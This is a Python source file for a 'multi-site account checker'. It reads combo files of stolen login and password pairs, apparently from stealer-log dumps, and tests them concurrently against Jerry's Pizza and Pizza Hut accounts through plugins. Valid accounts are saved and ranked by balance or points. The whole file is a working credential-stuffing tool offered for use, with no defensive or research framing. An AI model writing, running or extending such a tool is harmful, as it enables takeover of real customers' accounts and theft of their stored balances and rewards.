import asyncio
import aiohttp
import re
import json
import os
from datetime import datetime
from typing import Dict, List, Tuple, Optional
import tkinter as tk
from tkinter import filedialog
from pathlib import Path
import time

from plugins import JerrysPizzaPlugin, PizzaHutPlugin
from plugins.base import WebsitePlugin

class MultiSiteChecker:
    def __init__(self, plugin: WebsitePlugin):
        self.plugin = plugin
        self.success_file = self.get_next_success_file()
        self.valid_accounts = []
        self.checked = 0
        self.total = 0
        self.start_time = None
        self.lock = asyncio.Lock()
    
    def get_next_success_file(self) -> str:
        """Get the next available success file name with incrementing number"""
        i = 1
        while os.path.exists(f'success_{self.plugin.name}_{i}.json'):
            i += 1
        return f'success_{self.plugin.name}_{i}.json'
    
    def parse_combo_file(self, filepath: str) -> List[Dict[str, str]]:
        """Parse the combo file and extract login credentials"""
        combos = []
        
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        # Pattern to match Result entries
        pattern = r'Result \d+:.*?Login:\s*(.+?)\s*Password:\s*(.+?)\s*URL:'
        matches = re.findall(pattern, content, re.DOTALL)
        
        for login, password in matches:
            login = login.strip()
            password = password.strip()
            
            # Skip invalid entries
            if not login or not password or len(login) < 3 or len(password) < 3:
                continue
            
            # Use plugin to parse credentials
            combo = self.plugin.parse_combo_line(login, password)
            if combo:
                combos.append(combo)
        
        return combos
    
    async def append_to_success_file(self, account_data: Dict):
        """Append a valid account to success.json in real-time, keeping it sorted"""
        async with self.lock:
            try:
                if os.path.exists(self.success_file):
                    with open(self.success_file, 'r', encoding='utf-8') as f:
                        try:
                            accounts = json.load(f)
                        except json.JSONDecodeError:
                            accounts = []
                else:
                    accounts = []
                
                accounts.append(account_data)
                
                # Sort by balance/points
                balance_key = self.plugin.get_balance_key()
                accounts.sort(key=lambda x: x.get(balance_key, 0), reverse=True)
                
                with open(self.success_file, 'w', encoding='utf-8') as f:
                    json.dump(accounts, f, indent=2, ensure_ascii=False)
            except Exception as e:
                print(f"\n[!] Error writing to success file: {e}")
    
    async def worker(self, queue: asyncio.Queue, session: aiohttp.ClientSession, worker_id: int):
        """Worker coroutine to process accounts from queue"""
        while True:
            try:
                combo = await queue.get()
                if combo is None:  # Poison pill
                    queue.task_done()
                    break
                
                login = combo['login']
                password = combo['password']
                original_login = combo.get('original_login', login)
                
                result = await self.plugin.check_account(session, login, password, original_login)
                
                self.checked += 1
                
                if result:
                    async with self.lock:
                        self.valid_accounts.append(result)
                    
                    # Save immediately
                    await self.append_to_success_file(result)
                    
                    display = self.plugin.format_account_display(result)
                    print(f"\r[✓] Valid: {display}", flush=True)
                else:
                    print(f"\r[✗] Invalid: {original_login}", flush=True)
                
                # Progress update
                elapsed = time.time() - self.start_time
                rate = self.checked / elapsed if elapsed > 0 else 0
                print(f"Progress: {self.checked}/{self.total} | Valid: {len(self.valid_accounts)} | Rate: {rate:.1f}/s", end='')
                
                queue.task_done()
                
            except Exception as e:
                queue.task_done()
    
    async def run_checker(self, combos: List[Dict[str, str]], max_workers: int = 50):
        """Run the checker with concurrent workers"""
        self.total = len(combos)
        self.checked = 0
        self.start_time = time.time()
        
        print(f"\n[*] Starting {self.plugin.display_name} checker with {max_workers} workers")
        print(f"[*] Total accounts to check: {self.total}\n")
        
        # Create queue and add combos
        queue = asyncio.Queue()
        for combo in combos:
            await queue.put(combo)
        
        # Add poison pills for workers
        for _ in range(max_workers):
            await queue.put(None)
        
        # Create session with connection pooling
        connector = aiohttp.TCPConnector(
            limit=max_workers,
            limit_per_host=max_workers,
            ttl_dns_cache=300
        )
        
        async with aiohttp.ClientSession(connector=connector) as session:
            # Create workers
            workers = [
                asyncio.create_task(self.worker(queue, session, i))
                for i in range(max_workers)
            ]
            
            # Wait for all work to complete
            await queue.join()
            
            # Wait for workers to finish
            await asyncio.gather(*workers)
        
        elapsed = time.time() - self.start_time
        print(f"\n\n[*] Checking complete!")
        print(f"[*] Time elapsed: {elapsed:.2f}s")
        print(f"[*] Average rate: {self.total/elapsed:.1f} accounts/s")
        print(f"[*] Valid accounts: {len(self.valid_accounts)}")
        print(f"[*] Invalid accounts: {self.total - len(self.valid_accounts)}")
    
    def save_results(self):
        """Create final TXT summary file"""
        if self.valid_accounts:
            number = self.success_file.replace(f'success_{self.plugin.name}_', '').replace('.json', '')
            success_txt = f'success_{self.plugin.name}_{number}.txt'
            
            with open(success_txt, 'w', encoding='utf-8') as f:
                f.write("=" * 80 + "\n")
                f.write(f"{self.plugin.display_name.upper()} VALID ACCOUNTS - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 80 + "\n\n")
                
                for i, acc in enumerate(self.valid_accounts, 1):
                    f.write(f"Account #{i}\n")
                    for key, value in acc.items():
                        if key != 'website':
                            f.write(f"{key}: {value}\n")
                    f.write("-" * 80 + "\n\n")
            
            print(f"\n[+] Valid accounts saved to: {self.success_file}")
            print(f"[+] Valid accounts (TXT) saved to: {success_txt}")


def select_file():
    """Open file dialog to select combo file"""
    root = tk.Tk()
    root.withdraw()
    root.attributes('-topmost', True)
    
    filepath = filedialog.askopenfilename(
        title="Select combo file",
        filetypes=[
            ("Text files", "*.txt"),
            ("All files", "*.*")
        ]
    )
    
    root.destroy()
    return filepath


async def main():
    print("=" * 80)
    print("MULTI-SITE ACCOUNT CHECKER")
    print("=" * 80)
    
    # Select website
    print("\n[*] Select website to check:")
    print("  1. Jerry's Pizza")
    print("  2. Pizza Hut")
    
    try:
        choice = input("\nEnter choice (1 or 2): ").strip()
        if choice == '1':
            plugin = JerrysPizzaPlugin()
        elif choice == '2':
            plugin = PizzaHutPlugin()
        else:
            print("[!] Invalid choice. Exiting...")
            return
    except:
        print("[!] Invalid input. Exiting...")
        return
    
    print(f"\n[+] Selected: {plugin.display_name}")
    
    # Select file
    print("\n[*] Please select the combo file...")
    filepath = select_file()
    
    if not filepath:
        print("[!] No file selected. Exiting...")
        return
    
    print(f"[+] Selected file: {filepath}")
    
    # Initialize checker
    checker = MultiSiteChecker(plugin)
    
    # Parse combos
    print("[*] Parsing combo file...")
    combos = checker.parse_combo_file(filepath)
    
    if not combos:
        print("[!] No valid combos found in file. Exiting...")
        return
    
    print(f"[+] Found {len(combos)} combos to check")
    
    # Ask for worker count
    try:
        workers = input("\n[?] Enter number of concurrent workers (default: 50, max: 100): ").strip()
        workers = int(workers) if workers else 50
        workers = min(max(1, workers), 100)
    except ValueError:
        workers = 50
    
    # Run checker
    await checker.run_checker(combos, max_workers=workers)
    
    # Save results
    checker.save_results()
    
    print("\n[*] Done!")
    input("\nPress Enter to exit...")


if __name__ == "__main__":
    asyncio.run(main())
